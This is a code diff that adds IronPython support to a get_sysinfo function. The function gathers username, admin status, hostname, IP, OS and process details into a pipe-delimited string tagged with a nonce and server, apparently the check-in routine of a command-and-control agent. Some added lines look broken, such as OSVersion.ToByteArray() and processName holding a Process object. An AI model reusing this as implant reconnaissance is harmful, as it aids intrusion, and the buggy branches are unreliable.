@@ -1,9 +1,16 @@
 import os
 import platform
 import sys
-import pwd
 import socket
 import subprocess
+import platform
+if platform.python_implementation() == 'IronPython':
+    from System.Diagnostics import Process
+    from System import Environment
+    from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
+else:
+    import pwd
+
 
 def get_sysinfo(nonce='00000000'):
     # NOTE: requires global variable "server" to be set
@@ -12,23 +19,36 @@ def get_sysinfo(nonce='00000000'):
     __FAILED_FUNCTION = '[FAILED QUERY]'
 
     try:
-        username = pwd.getpwuid(os.getuid())[0].strip("\\")
+        if platform.python_implementation() == 'IronPython':
+            username = Environment.UserName
+        else:
+            username = pwd.getpwuid(os.getuid())[0].strip("\\")
     except Exception as e:
         username = __FAILED_FUNCTION
     try:
-        uid = os.popen('id -u').read().strip()
+        if platform.python_implementation() == 'IronPython':
+            uid = WindowsIdentity.GetCurrent().User.ToByteArray()
+        else:
+            uid = os.popen('id -u').read().strip()
     except Exception as e:
         uid = __FAILED_FUNCTION
     try:
-        highIntegrity = "True" if (uid == "0") else False
+        if platform.python_implementation() == 'IronPython':
+            highIntegrity = WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
+        else:
+            highIntegrity = "True" if (uid == "0") else False
     except Exception as e:
         highIntegrity = __FAILED_FUNCTION
     try:
-        osDetails = os.uname()
+        if platform.python_implementation() != 'IronPython':
+            osDetails = os.uname()
     except Exception as e:
         osDetails = __FAILED_FUNCTION
     try:
-        hostname = osDetails[1]
+        if platform.python_implementation() == 'IronPython':
+            hostname = Environment.MachineName
+        else:
+            hostname = osDetails[1]
     except Exception as e:
         hostname = __FAILED_FUNCTION
     try:
@@ -39,11 +59,17 @@ def get_sysinfo(nonce='00000000'):
         except Exception as e1:
             internalIP = __FAILED_FUNCTION
     try:
-        osDetails = ",".join(osDetails)
+        if platform.python_implementation() == 'IronPython':
+            osDetails = Environment.OSVersion.ToByteArray()
+        else:
+            osDetails = ",".join(osDetails)
     except Exception as e:
         osDetails = __FAILED_FUNCTION
     try:
-        processID = os.getpid()
+        if platform.python_implementation() == 'IronPython':
+            processID = Process.GetCurrentProcess().Id
+        else:
+            processID = os.getpid()
     except Exception as e:
         processID = __FAILED_FUNCTION
     try:
@@ -56,13 +82,17 @@ def get_sysinfo(nonce='00000000'):
     except Exception as e:
         architecture = __FAILED_FUNCTION
 
-    language = 'python'
-    cmd = 'ps %s' % (os.getpid())
-    ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    out, err = ps.communicate()
-    parts = out.split(b"\n")
-    if len(parts) > 2:
-        processName = b" ".join(parts[1].split()[4:])
+    if platform.python_implementation() == 'IronPython':
+        language = 'ironpython'
+        processName = Process.GetCurrentProcess()
     else:
-        processName = 'python'
-    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName.decode('UTF-8'), processID, language, pyVersion, architecture)
+        language = 'python'
+        cmd = 'ps %s' % (os.getpid())
+        ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = ps.communicate()
+        parts = out.split(b"\n")
+        if len(parts) > 2:
+            processName = b" ".join(parts[1].split()[4:]).decode('UTF-8')
+        else:
+            processName = 'python'
+    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language, pyVersion, architecture)
